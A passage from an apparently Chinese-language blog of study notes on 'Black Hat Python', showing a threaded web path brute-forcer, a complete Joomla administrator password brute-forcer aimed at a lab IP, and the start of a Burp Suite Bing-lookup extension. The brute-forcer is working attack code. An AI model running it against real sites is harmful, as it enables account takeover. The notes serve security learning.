</span></span><span class=line><span class=cl>            <span class=n>remote_path</span> <span class=o>=</span> <span class=n>remote_path</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>splitext</span><span class=p>(</span><span class=n>files</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>filters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>web_paths</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=n>remote_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_remote</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>web_paths</span><span class=o>.</span><span class=n>empty</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>path</span> <span class=o>=</span> <span class=n>web_paths</span><span class=o>.</span><span class=n>get</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>%s%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>request</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>request</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>%d</span><span class=s2>] =&gt; </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>code</span><span class=p>,</span> <span class=n>path</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>response</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>urllib</span><span class=o>.</span><span class=n>error</span><span class=o>.</span><span class=n>HTTPError</span> <span class=k>as</span> <span class=n>error</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Failed </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>error</span><span class=o>.</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>threads</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Spawning thread: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>test_remote</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span></code></pre></div><p>與上面的程式一樣是暴力法，但是list的來源一個是字典檔，這個是下載回來的檔案(ex:joomla)</p><p>小總結: 生出有單字的queue -> 讓thread發request去戳 -> 看有沒有成功</p><hr><p>joomla_killer.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>http.cookiejar</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>queue</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>abc</span> <span class=kn>import</span> <span class=n>ABC</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>html.parser</span> <span class=kn>import</span> <span class=n>HTMLParser</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># general settings</span>
</span></span><span class=line><span class=cl><span class=n>user_thread</span> <span class=o>=</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;admin&#34;</span>
</span></span><span class=line><span class=cl><span class=n>wordlist_file</span> <span class=o>=</span> <span class=s2>&#34;cain.txt&#34;</span>
</span></span><span class=line><span class=cl><span class=n>resume</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># target specific settings</span>
</span></span><span class=line><span class=cl><span class=n>target_url</span> <span class=o>=</span> <span class=s2>&#34;http://192.168.112.131/administrator/index.php&#34;</span>
</span></span><span class=line><span class=cl><span class=n>target_post</span> <span class=o>=</span> <span class=s2>&#34;http://192.168.112.131/administrator/index.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>username_field</span> <span class=o>=</span> <span class=s2>&#34;username&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password_field</span> <span class=o>=</span> <span class=s2>&#34;passwd&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>success_check</span> <span class=o>=</span> <span class=s2>&#34;Administration - Control Panel&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>BruteParser</span><span class=p>(</span><span class=n>HTMLParser</span><span class=p>,</span> <span class=n>ABC</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>HTMLParser</span><span class=o>.</span><span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>tag_results</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>handle_starttag</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>tag</span><span class=p>,</span> <span class=n>attrs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tag</span> <span class=o>==</span> <span class=s2>&#34;input&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tag_name</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>name</span><span class=p>,</span> <span class=n>value</span> <span class=ow>in</span> <span class=n>attrs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;name&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>tag_name</span> <span class=o>=</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>tag_name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>tag_results</span><span class=p>[</span><span class=n>tag_name</span><span class=p>]</span> <span class=o>=</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Bruter</span><span class=p>(</span><span class=nb>object</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>words_q</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>username</span> <span class=o>=</span> <span class=n>user</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>password_q</span> <span class=o>=</span> <span class=n>words_q</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>found</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Finished setting up for: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>user</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run_bruteforce</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>user_thread</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>web_bruter</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>web_bruter</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=ow>not</span> <span class=bp>self</span><span class=o>.</span><span class=n>password_q</span><span class=o>.</span><span class=n>empty</span><span class=p>()</span> <span class=ow>and</span> <span class=ow>not</span> <span class=bp>self</span><span class=o>.</span><span class=n>found</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>brute</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>password_q</span><span class=o>.</span><span class=n>get</span><span class=p>()</span><span class=o>.</span><span class=n>rstrip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>jar</span> <span class=o>=</span> <span class=n>http</span><span class=o>.</span><span class=n>cookiejar</span><span class=o>.</span><span class=n>FileCookieJar</span><span class=p>(</span><span class=s2>&#34;cookies&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>opener</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>build_opener</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>HTTPCookieProcessor</span><span class=p>(</span><span class=n>jar</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>response</span> <span class=o>=</span> <span class=n>opener</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>target_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>page</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Trying: </span><span class=si>%s</span><span class=s2> : </span><span class=si>%s</span><span class=s2> (</span><span class=si>%d</span><span class=s2> left)&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>username</span><span class=p>,</span> <span class=n>brute</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>password_q</span><span class=o>.</span><span class=n>qsize</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># parse out the hidden fields</span>
</span></span><span class=line><span class=cl>            <span class=n>parser</span> <span class=o>=</span> <span class=n>BruteParser</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>parser</span><span class=o>.</span><span class=n>feed</span><span class=p>(</span><span class=n>page</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>post_tags</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>tag_results</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># add our username and password fields</span>
</span></span><span class=line><span class=cl>            <span class=n>post_tags</span><span class=p>[</span><span class=n>username_field</span><span class=p>]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>username</span>
</span></span><span class=line><span class=cl>            <span class=n>post_tags</span><span class=p>[</span><span class=n>password_field</span><span class=p>]</span> <span class=o>=</span> <span class=n>brute</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>login_data</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>urlencode</span><span class=p>(</span><span class=n>post_tags</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>login_response</span> <span class=o>=</span> <span class=n>opener</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>target_post</span><span class=p>,</span> <span class=n>login_data</span><span class=p>)</span> <span class=c1>#這樣就可以丟post!!</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>login_result</span> <span class=o>=</span> <span class=n>login_response</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>success_check</span> <span class=ow>in</span> <span class=n>login_result</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>found</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Bruteforce successful.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Username: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Password: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>brute</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Waiting for other threads to exit...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_wordlist</span><span class=p>(</span><span class=n>wordlst_file</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># read in the word list</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>wordlst_file</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>raw_words</span> <span class=o>=</span> <span class=p>[</span><span class=n>line</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>fd</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>found_resume</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>word_queue</span> <span class=o>=</span> <span class=n>queue</span><span class=o>.</span><span class=n>Queue</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>raw_words</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>word</span> <span class=o>=</span> <span class=n>word</span><span class=o>.</span><span class=n>rstrip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>resume</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>found_resume</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>word_queue</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=n>word</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>word</span> <span class=o>==</span> <span class=n>resume</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>found_resume</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Resuming wordlist from: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>resume</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>word_queue</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=n>word</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>word_queue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>words</span> <span class=o>=</span> <span class=n>build_wordlist</span><span class=p>(</span><span class=n>wordlist_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bruter_obj</span> <span class=o>=</span> <span class=n>Bruter</span><span class=p>(</span><span class=n>username</span><span class=p>,</span> <span class=n>words</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bruter_obj</span><span class=o>.</span><span class=n>run_bruteforce</span><span class=p>()</span>
</span></span></code></pre></div><p><img loading=lazy src=https://i.imgur.com/pvk70rJ.png alt>
這裡是要送post的form，要替所有input都填上值，再用post打出去
不過那個opener用起來感覺不太直覺啊</p><h2 id=ch6>CH6<a hidden class=anchor aria-hidden=true href=#ch6>#</a></h2><p>準備好jython的jar，之後就可以在burp加入自己的功能了</p><p>但說老實的，我沒用過burp阿
之後應該用用burp，並記錄下來。</p><p>bhp_bing.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.error</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>burp</span> <span class=kn>import</span> <span class=n>IBurpExtender</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>burp</span> <span class=kn>import</span> <span class=n>IContextMenuFactory</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>java.net</span> <span class=kn>import</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>java.util</span> <span class=kn>import</span> <span class=n>ArrayList</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>javax.swing</span> <span class=kn>import</span> <span class=n>JMenuItem</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bing_api_key</span> <span class=o>=</span> <span class=s2>&#34;YOURKEYHERE&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>BurpExtender</span><span class=p>(</span><span class=n>IBurpExtender</span><span class=p>,</span> <span class=n>IContextMenuFactory</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># implements</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>registerExtenderCallbacks</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>callbacks</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_callbacks</span> <span class=o>=</span> <span class=n>callbacks</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_helpers</span> <span class=o>=</span> <span class=n>callbacks</span><span class=o>.</span><span class=n>getHelpers</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>context</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># we set up our extension</span>
</span></span><span class=line><span class=cl>        <span class=n>callbacks</span><span class=o>.</span><span class=n>setExtensionName</span><span class=p>(</span><span class=s2>&#34;BHP Bing&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>callbacks</span><span class=o>.</span><span class=n>registerContextMenuFactory</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># implements</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>createMenuItems</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>context_menu</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>context</span> <span class=o>=</span> <span class=n>context_menu</span>
</span></span><span class=line><span class=cl>        <span class=n>menu_list</span> <span class=o>=</span> <span class=n>ArrayList</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>menu_list</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>JMenuItem</span><span class=p>(</span><span class=s2>&#34;Send to Bing&#34;</span><span class=p>,</span> <span class=n>actionPerformed</span><span class=o>=</span><span class=bp>self</span><span class=o>.</span><span class=n>bing_menu</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>menu_list</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>bing_menu</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>event</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># grab the details of what the user clicked</span>
</span></span><span class=line><span class=cl>        <span class=n>http_traffic</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>context</span><span class=o>.</span><span class=n>getSelectedMessages</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=s2> requests highlighted&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>http_traffic</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>traffic</span> <span class=ow>in</span> <span class=n>http_traffic</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>http_service</span> <span class=o>=</span> <span class=n>traffic</span><span class=o>.</span><span class=n>getHttpService</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>host</span> <span class=o>=</span> <span class=n>http_service</span><span class=o>.</span><span class=n>getHost</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;User selected host: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>bing_search</span><span class=p>(</span><span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>bing_search</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>host</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># check if we have an IP or hostname</span>
</span></span><span class=line><span class=cl>        <span class=n>is_ip</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;[0-9]+(?:\.[0-9]+)</span><span class=si>{3}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>is_ip</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_address</span> <span class=o>=</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>            <span class=n>domain</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_address</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>gethostbyname</span><span class=p>(</span><span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>domain</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>bing_query_string</span> <span class=o>=</span> <span class=s2>&#34;&#39;ip:</span><span class=si>%s</span><span class=s2>&#39;&#34;</span> <span class=o>%</span> <span class=n>ip_address</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>bing_query</span><span class=p>(</span><span class=n>bing_query_string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>domain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>bing_query_string</span> <span class=o>=</span> <span class=s2>&#34;&#39;domain:</span><span class=si>%s</span><span class=s2>&#39;&#34;</span> <span class=o>%</span> <span class=n>host</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>bing_query</span><span class=p>(</span><span class=n>bing_query_string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>bing_query</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>bing_query_string</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Performing Bing search: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>bing_query_string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># encode our query</span>
</span></span><span class=line><span class=cl>        <span class=n>quoted_query</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>bing_query_string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>http_request</span> <span class=o>=</span> <span class=s2>&#34;GET https://api.datamarket.azure.com/Bing/Search/Web?$format=json&amp;$top=20&amp;Query=</span><span class=si>%s</span><span class=s2> HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>quoted_query</span>
</span></span><span class=line><span class=cl>        <span class=n>http_request</span> <span class=o>+=</span> <span class=s2>&#34;Host: api.datamarket.azure.com</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>http_request</span> <span class=o>+=</span> <span class=s2>&#34;Connection: close</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>http_request</span> <span class=o>+=</span> <span class=s2>&#34;Authorization: Basic </span><span class=si>%s</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;:</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>bing_api_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>http_request</span> <span class=o>+=</span> <span class=s2>&#34;User-Agent: Blackhat Python</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>json_body</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_callbacks</span><span class=o>.</span><span class=n>makeHttpRequest</span><span class=p>(</span><span class=s2>&#34;api.datamarket.azure.com&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                    <span class=mi>443</span><span class=p>,</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                    <span class=n>http_request</span><span class=p>)</span><span class=o>.</span><span class=n>tostring</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
